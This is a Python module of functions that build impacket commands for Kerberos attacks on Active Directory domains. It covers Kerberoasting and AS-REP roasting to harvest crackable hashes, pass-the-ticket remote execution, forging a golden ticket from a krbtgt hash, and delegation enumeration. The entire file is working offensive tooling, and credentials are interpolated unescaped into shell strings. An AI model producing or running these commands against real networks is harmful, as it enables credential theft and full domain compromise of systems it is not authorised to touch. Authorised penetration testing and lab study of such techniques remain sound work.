"""Kerberos attack command builders: Kerberoasting, AS-REP, tickets, delegation."""

from __future__ import annotations

__all__ = [
    "kerberoast_command",
    "asreproast_command",
    "pass_the_ticket_command",
    "golden_ticket_command",
    "find_delegation_command",
]

def kerberoast_command(
    domain: str,
    username: str,
    password: str,
    dc_ip: str,
    *,
    output: str = "hashes.kerberoast",
) -> str:
    """Build an impacket GetUserSPNs command to request Kerberoastable TGS hashes."""
    return (
        f"GetUserSPNs.py {domain}/{username}:'{password}' "
        f"-dc-ip {dc_ip} -request -outputfile {output}"
    )

def asreproast_command(
    domain: str,
    dc_ip: str,
    *,
    users_file: str | None = None,
    username: str = "",
    password: str = "",
    output: str = "hashes.asreproast",
) -> str:
    """Build an impacket GetNPUsers command for AS-REP Roasting.

    If *users_file* is provided, enumerates without credentials.
    """
    auth = f"{domain}/{username}:'{password}'" if username else f"{domain}/"
    target = f"-usersfile {users_file}" if users_file else "-request"
    return (
        f"GetNPUsers.py {auth} -dc-ip {dc_ip} {target} "
        f"-outputfile {output} -format hashcat"
    )

def pass_the_ticket_command(
    ccache_file: str,
    target: str,
    username: str,
    domain: str,
    *,
    command: str = "whoami /all",
    method: str = "wmiexec",
) -> list[str]:
    """Return commands to use a Kerberos ccache for Pass-the-Ticket execution."""
    return [
        f"export KRB5CCNAME={ccache_file}",
        f"{method}.py -k -no-pass {domain}/{username}@{target} '{command}'",
    ]

def golden_ticket_command(
    domain: str,
    domain_sid: str,
    krbtgt_hash: str,
    target_user: str = "Administrator",
    *,
    output: str | None = None,
) -> list[str]:
    """Return impacket ticketer commands to forge a Golden Ticket.

    Sets ``KRB5CCNAME`` after creation for immediate use.
    """
    ccache = output or f"{target_user}.ccache"
    return [
        (
            f"ticketer.py -nthash {krbtgt_hash} -domain-sid {domain_sid} "
            f"-domain {domain} {target_user}"
        ),
        f"export KRB5CCNAME=$(pwd)/{ccache}",
    ]

def find_delegation_command(
    domain: str,
    username: str,
    password: str,
    dc_ip: str,
) -> list[str]:
    """Return commands to enumerate Kerberos delegation configurations."""
    return [
        f"findDelegation.py {domain}/{username}:'{password}' -dc-ip {dc_ip}",
        (
            f"GetUserSPNs.py {domain}/{username}:'{password}' "
            f"-dc-ip {dc_ip} -target-domain {domain}"
        ),
    ]
